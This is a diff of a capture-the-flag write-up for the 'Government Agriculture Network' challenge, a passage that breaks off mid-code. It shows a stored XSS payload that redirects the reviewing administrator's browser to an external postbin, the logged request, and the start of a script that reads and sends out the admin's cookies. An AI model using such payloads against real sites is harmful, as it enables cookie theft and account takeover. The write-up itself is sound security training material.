@@ -1,26 +1,30 @@
-# Government Agricultire Network
+# Government Agriculture Network
 
-**Given:** web-address https://govagriculture.web.ctfcompetition.com/
+![img](./assets/government-agriculture-network-task.png)
+
+##### **Given:** web-address https://govagriculture.web.ctfcompetition.com/
 
 Following the link we get to the **Ministry of Agriculture** website. 
 
+![img](./assets/ministry-of-agriculture.png)
+
 Quick inspection of the source code doesn't give out a lot.
 
-There's a form to create a new post and a link to "/admin" page, which doesn't really work (303 SEE OTHER upon navigation and redirect back to main page).
+There's a form to create a new post and a link to `/admin` page, which doesn't really work (`303 SEE OTHER` upon navigation and redirect back to main page).
 
-Let's try to create a new post. On sumbit we're being redirected to /post page with following message:
+Let's try to create a new post. On submit we're being redirected to `/post` page with following message:
 
 ```
 Your post was submitted for review. Administator will take a look shortly.
 ```
-This message gives an important piece of information: administrator is going to review our post. If there's a xss vulnerability present then it can be possible to execute a script in administrator's browser.
+This message gives an important piece of information: administrator is going to review our message. If there's a xss vulnerability present then it can be possible to execute a script in administrator's browser.
 
-Let's create a [postbin](https://postb.in/) and write up a simple sctipt which will call our postbin upon execution by the victim's browser:
+Let's create a [postbin](https://postb.in/) and write up a simple script which will call our postbin upon execution by the victim's browser:
 
 ```
 <script>document.location.href='https://postb.in/1586263800460-8725055831018'</script>
 ```
-Immediately we can see that the request reached the bin:
+Immediately after submitting this script we can see that the request reached the bin:
 ```
 x-real-ip: 104.155.55.51
 host: postb.in
@@ -30,7 +34,7 @@ referer: https://govagriculture.web.ctfcompetition.com/pwn?msg=%3Cscript%3Edocum
 [...]
 ```
 
-Let's modify the scipt to fetch admin's cookies and send it to us:
+Let's modify the script to fetch admin's cookies and send it to us:
 ```
 <script>
 cookie = document.cookie
